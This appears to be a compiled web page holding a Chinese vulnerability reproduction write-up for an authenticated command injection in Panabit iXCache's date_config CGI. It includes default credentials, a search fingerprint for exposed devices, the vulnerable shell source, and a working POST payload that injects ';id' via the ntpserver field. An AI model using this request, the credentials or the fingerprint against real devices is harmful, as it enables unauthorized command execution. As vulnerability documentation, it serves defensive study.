import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as n}from"./app-58e4a7d6.js";const l={},a=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Panabit iXCache
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;iXCache&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084931046.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>默认账号密码为：admin/ixcache , 存在漏洞的模块为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/cgi-bin/Maintain/date_config
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 userverify.cgi</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085003951.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>接收请求参数的方式如下，通过快速搜索查找可能交互的地方</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;\${REQUEST_METHOD}&quot; = &quot;POST&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085018386.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085054479.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#!/bin/sh
#This script is created by ssparser automatically. The parser first created by MaoShouyan
printf &quot;Content-type: text/html
Cache-Control: no-cache

&quot;
echo -n &quot;&quot;; 
. ../common/common.sh
myself=&quot;/cgi-bin/Maintain/\`basename $0\`&quot;

echo -n &quot;
&lt;script languate=\\&quot;javascript\\&quot;&gt;
function Validate(frm)
{
	frm.ntpserver.value = TrimAll(frm.ntpserver.value);
	if (frm.ntpserver.value != \\&quot;\\&quot; &amp;&amp; !IsIPAddr(frm.ntpserver.value)) {
		alert(\\&quot;请输入IP地址!\\&quot;);
		frm.ntpserver.select();
		return false;
	}
	return true;
}
&lt;/script&gt;
&quot;;
if [ &quot;\${REQUEST_METHOD}&quot; = &quot;POST&quot; ]; then
	operator_check &quot;\${myself}&quot;
	[ &quot;\${CGI_ntpserver}&quot; = &quot;&quot; ] &amp;&amp; CGI_ntpserver=&quot;0.0.0.0&quot;
	echo &quot;ntpserver_ip=\${CGI_ntpserver}&quot; &gt; \${PGETC}/ntp.conf
	timefmt=&quot;\${CGI_year}\${CGI_month}\${CGI_day}\${CGI_hour}\${CGI_minute}.\${CGI_second}&quot;
	errmsg=\`date \${timefmt}\`
	[ &quot;\${CGI_ntpserver}&quot; != &quot;0.0.0.0&quot; ] &amp;&amp; ntpdate -t 10 \${CGI_ntpserver}
	
	afm_dialog_msg &quot;操作成功!&quot;
fi
year=\`date &quot;+%Y&quot;\`
month=\`date &quot;+%m&quot;\`
day=\`date &quot;+%d&quot;\`
hour=\`date &quot;+%H&quot;\`
minute=\`date &quot;+%M&quot;\`
second=\`date &quot;+%S&quot;\`
if [ -f \${PGETC}/ntp.conf ]; then
	. \${PGETC}/ntp.conf
	CGI_ntpserver=&quot;\${ntpserver_ip}&quot;
fi
[ &quot;\${CGI_ntpserver}&quot; = &quot;&quot; ] &amp;&amp; CGI_ntpserver=&quot;0.0.0.0&quot;

echo -n &quot;
&lt;body&gt;
&quot;; cgi_show_title &quot;系统管理-&gt;系统时间&quot; 
echo -n &quot;
&lt;br&gt;
&lt;form method=post onsubmit=\\&quot;return Validate(this)\\&quot; action=\\&quot;\${myself}\\&quot;&gt;
&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\\&quot;#ffffff\\&quot;&gt;
&lt;tr id=row1 height=22&gt;
	&lt;td width=40&gt;&lt;/td&gt;
	&lt;td width=90 align=left&gt;NTP服务器&lt;/td&gt;
	&lt;td width=* align=left&gt;
		&lt;input type=text name=ntpserver style=\\&quot;width:120px\\&quot; value=\\&quot;\${CGI_ntpserver}\\&quot;&gt;&lt;/input&gt;&amp;nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\\&quot;#ffffff\\&quot;&gt;
&lt;tr id=row1 height=22&gt;
	&lt;td width=40&gt;&lt;/td&gt;
	&lt;td width=90 align=left&gt;年/月/日&lt;/td&gt;
	&lt;td width=* align=left&gt;
	&lt;select name=year style=\\&quot;width:60px\\&quot; value=\${year}&gt;
	&quot;;
		tmpvar=2000
		while [ \${tmpvar} -le 2020 ]; do
			if [ \${tmpvar} -eq \${year} ]; then
				echo &quot;&lt;option value=\${tmpvar} selected&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\${tmpvar}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;年
	&lt;select name=month style=\\&quot;width:60px\\&quot; value=\${month}&gt;
	&quot;;
		tmpvar=1
		while [ \${tmpvar} -le 12 ]; do
			selected=&quot;&quot;
			[ \${tmpvar} -eq \${month} ] &amp;&amp; selected=&quot;selected&quot;
			if [ \${tmpvar} -lt 10 ]; then
				echo &quot;&lt;option value=\\&quot;0\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\\&quot;\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;月
	&lt;select name=day style=\\&quot;width:60px\\&quot; value=\${day}&gt;
	&quot;;
		tmpvar=1
		while [ \${tmpvar} -le 31 ]; do
			selected=&quot;&quot;
			[ \${tmpvar} -eq \${day} ] &amp;&amp; selected=&quot;selected&quot;
			if [ \${tmpvar} -lt 10 ]; then
				echo &quot;&lt;option value=\\&quot;0\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\\&quot;\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;日&lt;/td&gt;
&lt;/tr&gt;
&lt;tr id=row1&gt;
	&lt;td&gt;&lt;/td&gt;
	&lt;td align=left&gt;时/分/秒&lt;/td&gt;
	&lt;td width=* align=left&gt;
	&lt;select name=hour value=0 style=\\&quot;width:60px\\&quot; value=\${hour}&gt;
	&quot;;
		tmpvar=0
		while [ \${tmpvar} -le 23 ]; do
			selected=&quot;&quot;
			[ \${tmpvar} -eq \${hour} ] &amp;&amp; selected=&quot;selected&quot;
			if [ \${tmpvar} -lt 10 ]; then
				echo &quot;&lt;option value=\\&quot;0\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\\&quot;\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;时
	&lt;select name=minute value=0 style=\\&quot;width:60px\\&quot; value=\${minute}&gt;
	&quot;;
		tmpvar=0
		while [ \${tmpvar} -le 59 ]; do
			selected=&quot;&quot;
			[ \${tmpvar} -eq \${minute} ] &amp;&amp; selected=&quot;selected&quot;
			if [ \${tmpvar} -lt 10 ]; then
				echo &quot;&lt;option value=\\&quot;0\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\\&quot;\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;分
	&lt;select name=second value=0 style=\\&quot;width:60px\\&quot; value=\${second}&gt;
	&quot;;
		tmpvar=0
		while [ \${tmpvar} -le 59 ]; do
			selected=&quot;&quot;
			[ \${tmpvar} -eq \${second} ] &amp;&amp; selected=&quot;selected&quot;
			if [ \${tmpvar} -lt 10 ]; then
				echo &quot;&lt;option value=\\&quot;0\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			else
				echo &quot;&lt;option value=\\&quot;\${tmpvar}\\&quot; \${selected}&gt;\${tmpvar}&lt;/option&gt;&quot;
			fi
			tmpvar=$((\${tmpvar} + 1))
		done
	
echo -n &quot;&lt;/select&gt;秒&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;table style=\\&quot;width:700; border-bottom:1px #787882 solid; color:#0000ff\\&quot;&gt;
&lt;tr&gt;&lt;td align=right&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;table style=\\&quot;width:700\\&quot;&gt; 
&lt;tr&gt;
        &lt;td align=right&gt;&lt;input type=submit style=\\&quot;width:70\\&quot; value=\\&quot;提交\\&quot;&gt;&lt;/input&gt;
	&lt;input type=hidden name=ifname value=\\&quot;fxp1\\&quot;&gt;&lt;/input&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/form&gt;
&lt;/table&gt;
&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
&quot;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085113258.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>\${CGI_ntpserver} 参数可以发现，受用户可控</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085129884.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>主要位置注意这个代码位置</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;ntpserver_ip=\${CGI_ntpserver}&quot; &gt; \${PGETC}/ntp.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里将参数写入 PGETC/ntp.conf 文件，查看文件位置，看一下变量 {PGETC} 配置</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085219275.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在 /etc 目录下找到了这个文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085232050.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>继续向下看</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085244308.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085259742.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /cgi-bin/Maintain/date_config

ntpserver=0.0.0.0;id&amp;year=2021&amp;month=08&amp;day=14&amp;hour=17&amp;minute=04&amp;second=50&amp;tz=Asiz&amp;bcy=Shanghai&amp;ifname=fxp1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085313769.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085338637.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>交互处可进行命令拼接造成注入</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085353610.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,39),d=[a];function s(v,u){return e(),i("div",null,d)}const c=t(l,[["render",s],["__file","Panabit iXCache date_config 后台命令执行漏洞.html.vue"]]);export{c as default};
